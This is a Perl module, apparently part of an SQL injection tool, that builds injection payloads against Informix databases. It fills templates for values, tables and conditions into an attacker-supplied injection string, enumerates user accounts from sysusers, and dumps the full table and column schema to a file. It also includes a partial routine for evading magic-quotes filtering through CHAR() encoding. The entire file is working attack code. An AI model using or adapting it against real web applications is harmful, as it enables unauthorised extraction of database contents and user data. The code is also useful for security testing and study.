package isr_informix;

#Author: Francisco Amato

use Data::Dump qw(dump);

#Tested in informix et.10.00
my $version="et.10.00";

my @space=(' ','\t','/**/');
#Atributos publicos

#Private variable
my @db_errors = (
	    {
             'code'  	=>'',
             'message'  =>'',
             'type'     =>0
            }
	    );

my @col_testpage=('username','usertype');
my $name_test='sysusers';

#SELECT tabname,colname, coltype, collength 
#  FROM systables a, syscolumns b 
 #  WHERE a.tabid = b.tabid and tabname NOT MATCHES 'sys*'; 

my @col_dbschema=('\'$NODBNAME$\'','tabname','colname','coltype');
my $name_dbschema='systables a, syscolumns b';
my $name_dbschematail='a.tabid = b.tabid and tabname NOT MATCHES \'sys*\'';

#Constructor y destructor de clase
sub new {
    my $classname = shift;
    my $class = {@_};

    #Atributos de instancia

    bless $class, $classname;
    return $class;
}

# Accessores y mutadores
sub get_testpage { my $class = shift; return $class->{testpage};}
sub get_dbschema { my $class = shift; return $class->{dbschema};}

#Public method
sub do_testpage {
    my $class = shift;
    $class->{testpage}=process_page($class,$name_test,-1,undef,undef,@col_testpage);
}

sub do_dbsnames {
    my $class = shift;
    $class->{error} = "Dbsnames not implement\n";
    $class->{dbsnames} = -1; # not implement
}


sub do_dbschema {
    my $class = shift;
    $class->{dbschema}=process_page($class,$name_dbschema,-1,$name_dbschematail,undef,@col_dbschema);
    die "Error: " . $class->{error} if ($class->{error});
    
    open(FF, "> ./template/$class->{conn}->{'session'}.dbschema");
        print FF $class->get_dbschema;
    close(FF);
		    
}

#Private method
sub process_page{

    my ($class,$table,$coltype,$where,$tail,@col) = @_;
    my $datos=$class->{conn}->{'inj'};
    my $val;
    my @ncol;
    
#    foreach(@col){
#	    push @ncol,"cast($_ as varchar(1000))";
#    }

    #select
    $val = &getconcat(@col);
    
    #
    $table=~ s/\$NODBNAME\$\.//gi;
    
    #where
    my $mwhere;
    if($where){ #exist structure where
        $mwhere = "where $where";
        if ($class->{conn}->{'where'}){ #user define where
            $mwhere .= " and $class->{conn}->{'where'}";
        }
    }elsif($class->{conn}->{'where'}){
        $mwhere="where $class->{conn}->{'where'}";
    }

    #tail
    my $mtail=$class->{conn}->{'tail'};
    
    $datos=~ s/\<VALUE\>/$val/gi;
    $datos=~ s/\<TABLE\>/$table/gi;
    $datos=~ s/\<WHERE\>/$mwhere/gi;
    $datos=~ s/\<TAIL\>/$mtail/gi;

    #Magic quotes evasion
    print "db don't support evasion magic quotes\n" if $class->{conn}->{'magicquotes'};
#    $datos =~ s/'([^']+)'/magicquotes($1)/egi if $class->{conn}->{'magicquotes'}; #'
	    
    $class->{lastinj}=$datos;
    $class->{conn}->getpage("",$datos);
    if ($class->{conn}->{code} == 404){
	$class->{error} = "Error 404\n";
    }else{
	$class->{error}=check_errors($class->{conn}->{response});
    }
    return $class->{conn}->{response};

}


sub magicquotes {
    my ($val) = @_;
    my @list= map { $_ = 'CHAR('.$_.')' } unpack('C*', $val);
    my $return  = &getconcat_magic(@list);
    return $return;
}
		    

sub check_errors {
    my ($response) = @_;
    my $ret="";
    foreach my $item (@db_errors){
	if ($response =~ /$item->{'code'}/){
	    $ret.="Code: $item->{'code'}, Detail: $item->{'message'}\n";
	}
    }
    return $ret;
}

sub getconcat {
    my (@items) =@_;
    my $can=$#items;
    my $str=getvalue($items[0]);
    for (my $i=1;$i <=$can;$i++)
    {
        $str.= "||'[__]'||".getvalue($items[$i]);
    }
    return $str;
}
									
sub getconcat_magic {
        my (@items) =@_;
        my $can=$#items;
        my $str="concat(".getvalue($items[0]).",".getvalue($items[1]).")";
        for (my $i=2;$i <=$can;$i++)
        {
                $str= "concat(".$str.",".getvalue($items[$i]).")";
        }
        return $str;
}


sub getvalue {
    my ($str) = @_;
    if ($str){
        return $str;
    }else{
        return "'".$str."'";
    }
}
1;
